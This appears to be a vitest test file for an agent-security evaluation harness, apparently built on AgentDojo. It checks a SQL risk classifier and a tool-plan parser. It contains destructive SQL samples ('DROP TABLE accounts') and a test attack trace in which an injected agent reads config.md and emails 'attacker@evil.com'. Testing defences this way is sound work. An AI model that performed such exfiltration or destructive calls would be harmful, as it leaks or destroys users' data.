import { describe, expect, it } from 'vitest';
import { declaredTrajectoryCalls, parseToolPlan, riskForTool } from '../scripts/agentdojo-real/model-in-loop';
import type { Task } from '../scripts/agentdojo-real/suite';

describe('model-in-the-loop evaluation plan parser', () => {
  it('classifies read-only SQL separately from destructive SQL', () => {
    expect(riskForTool('execute_sql', { sql: 'SELECT balance FROM accounts WHERE id = 1001' })).toBe('read');
    expect(riskForTool('execute_sql', { query: '  select * from transactions' })).toBe('read');
    expect(riskForTool('execute_sql', { sql: 'WITH recent AS (SELECT * FROM transactions) SELECT * FROM recent' })).toBe('read');
    expect(riskForTool('execute_sql', { sql: 'DROP TABLE accounts' })).toBe('destructive');
    expect(riskForTool('execute_sql', { sql: 'DELETE FROM transactions' })).toBe('destructive');
    expect(riskForTool('execute_sql', {})).toBe('destructive');
  });

  it('accepts plain and fenced JSON tool plans', () => {
    expect(parseToolPlan('[{"name":"read_file","arguments":{"path":"config.md"}}]')).toEqual([
      { name: 'read_file', arguments: { path: 'config.md' } },
    ]);
    expect(parseToolPlan('```json\n[{"name":"list_files","arguments":{}}]\n```')).toEqual([
      { name: 'list_files', arguments: {} },
    ]);
    expect(parseToolPlan('{"calls":[{"name":"list_files","arguments":{}}]}')).toEqual([
      { name: 'list_files', arguments: {} },
    ]);
  });

  it('authorizes the full trace for benign controls but only the benign prefix for attacks', () => {
    const control = {
      attackExpected: false,
      susceptibleTrace: [{ name: 'send_email', arguments: { to: 'boss@company.com' } }],
    } as Pick<Task, 'attackExpected' | 'susceptibleTrace'>;
    const attack = {
      attackExpected: true,
      susceptibleTrace: [
        { name: 'read_file', arguments: { path: 'config.md' } },
        { name: 'send_email', arguments: { to: 'attacker@evil.com' } },
      ],
    } as Pick<Task, 'attackExpected' | 'susceptibleTrace'>;
    expect(declaredTrajectoryCalls(control)).toEqual(control.susceptibleTrace);
    expect(declaredTrajectoryCalls(attack)).toEqual([attack.susceptibleTrace[0]]);
  });

  it('rejects prose, malformed calls, and oversized plans', () => {
    expect(parseToolPlan('I will read the file first.')).toBeNull();
    expect(parseToolPlan('[{"name":"read_file"}]')).toBeNull();
    const tooMany = Array.from({ length: 13 }, () => ({ name: 'list_files', arguments: {} }));
    expect(parseToolPlan(JSON.stringify(tooMany))).toBeNull();
  });
});
